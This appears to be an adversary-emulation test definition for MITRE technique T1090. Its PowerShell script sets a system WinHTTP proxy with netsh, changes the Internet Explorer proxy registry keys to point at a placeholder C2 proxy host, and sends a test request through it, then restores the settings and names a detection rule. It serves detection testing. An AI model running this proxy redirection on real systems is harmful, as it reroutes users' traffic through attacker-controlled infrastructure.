scripts.description: Simulates adversary use of network proxies and redirectors for C2 traffic: (1) configures a system-level WinINET proxy via netsh.exe winhttp set proxy (LOLBin), then immediately removes it; (2) modifies the Internet Explorer proxy registry settings (used by older malware and implants that use WinINET), then restores them; (3) tests connectivity through the configured proxy for the tunneling simulation. The netsh winhttp proxy modification is a high-fidelity MDE indicator for C2 infrastructure setup.
scripts.command: Write-Host '[START] T1090 - Proxy (system proxy configuration modification for C2 traffic routing)'; $proxyHost = '#{excalibur_c2_proxy_host}'; $proxyPort = '#{excalibur_c2_proxy_port}'; $proxyString = $proxyHost + ':' + $proxyPort; Write-Host '[INFO] Step 1/3: netsh winhttp set proxy (LOLBin - system-wide WinHTTP proxy modification)'; try { $beforeProxy = & netsh.exe winhttp show proxy 2>&1 | Where-Object { $_ -match '\S' }; Write-Host ('[INFO] Current WinHTTP proxy: ' + ($beforeProxy -join ' | ')); $setResult = & netsh.exe winhttp set proxy $proxyString 2>&1; Write-Host ('[INFO] Set proxy to: ' + $proxyString + ' | Result: ' + ($setResult -join ' ').Trim()); Start-Sleep 1; $null = & netsh.exe winhttp reset proxy 2>&1; Write-Host '[INFO] WinHTTP proxy reset to direct (restored)' } catch { Write-Host ('[WARN] netsh winhttp: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 2/3: IE/WinINET proxy registry modification (used by WinINET-based implants)'; $inetRegPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings'; try { $prevProxy = Get-ItemProperty -Path $inetRegPath -Name ProxyServer -ErrorAction SilentlyContinue; $prevEnabled = Get-ItemProperty -Path $inetRegPath -Name ProxyEnable -ErrorAction SilentlyContinue; Set-ItemProperty -Path $inetRegPath -Name ProxyServer -Value $proxyString -ErrorAction Stop; Set-ItemProperty -Path $inetRegPath -Name ProxyEnable -Value 1 -ErrorAction Stop; Write-Host ('[INFO] IE proxy set: ' + $proxyString + ' | ProxyEnable=1 - registry modification logged by MDE'); Start-Sleep 1; if ($prevProxy) { Set-ItemProperty -Path $inetRegPath -Name ProxyServer -Value $prevProxy.ProxyServer -ErrorAction SilentlyContinue } else { Remove-ItemProperty -Path $inetRegPath -Name ProxyServer -ErrorAction SilentlyContinue }; if ($prevEnabled) { Set-ItemProperty -Path $inetRegPath -Name ProxyEnable -Value $prevEnabled.ProxyEnable -ErrorAction SilentlyContinue } else { Set-ItemProperty -Path $inetRegPath -Name ProxyEnable -Value 0 -ErrorAction SilentlyContinue }; Write-Host '[INFO] IE proxy restored to original settings' } catch { Write-Host ('[WARN] IE proxy registry: ' + $_.Exception.Message); Set-ItemProperty -Path $inetRegPath -Name ProxyEnable -Value 0 -ErrorAction SilentlyContinue }; Write-Host '[INFO] Step 3/3: Proxy connectivity test via configured proxy'; try { $webProxy = New-Object System.Net.WebProxy('http://' + $proxyString); $req = [System.Net.WebRequest]::Create('http://www.microsoft.com/'); $req.Proxy = $webProxy; $req.Timeout = 3000; $resp = $req.GetResponse(); $resp.Close(); Write-Host '[INFO] Proxy connectivity: traffic successfully routed through proxy' } catch { Write-Host ('[INFO] Proxy connectivity: ' + $_.Exception.Message.Split([char]10)[0] + ' (expected if proxy unreachable - connection attempt was logged)') }; Write-Host '[SUCCESS] T1090 - Proxy C2 routing simulation completed. Sentinel target: System proxy configuration modified via netsh winhttp + IE proxy registry change (MDE behavioral - C2 proxy setup pattern)'
scripts.cleanup_command: & netsh.exe winhttp reset proxy 2>&1 | Out-Null; Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -Name ProxyEnable -Value 0 -ErrorAction SilentlyContinue; Write-Host '[INFO] T1090 cleanup: WinHTTP and IE proxy settings reset to direct'
scripts.detection_rule: System proxy configuration modified via netsh winhttp + IE proxy registry (C2 proxy setup)
